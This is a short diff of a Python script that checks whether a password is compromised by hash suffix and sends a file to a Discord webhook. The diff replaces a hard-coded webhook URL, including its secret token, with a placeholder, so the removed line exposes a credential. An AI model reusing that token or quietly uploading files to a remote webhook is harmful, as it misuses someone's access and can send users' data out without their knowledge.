@@ -1,3 +1,4 @@
+
 import requests
 import hashlib
 from getpass import getpass
@@ -12,7 +13,7 @@ def check_compromised_password(password):
     return suffix in response.text
 
 def send_to_discord_webhook(file_path):
-    webhook_url = "https://discord.com/api/webhooks/1183420914222772255/LpVpetQsdrlCjx6EEV4kLAkKXZd-y92VbQ143wYv6WXA9kOPXrFKPv0qC3Y-vFuk1_f2"
+    webhook_url = "INSERT DISCORD WEBHOOK HERE"
     
     try:
         with open(file_path, 'r') as file:
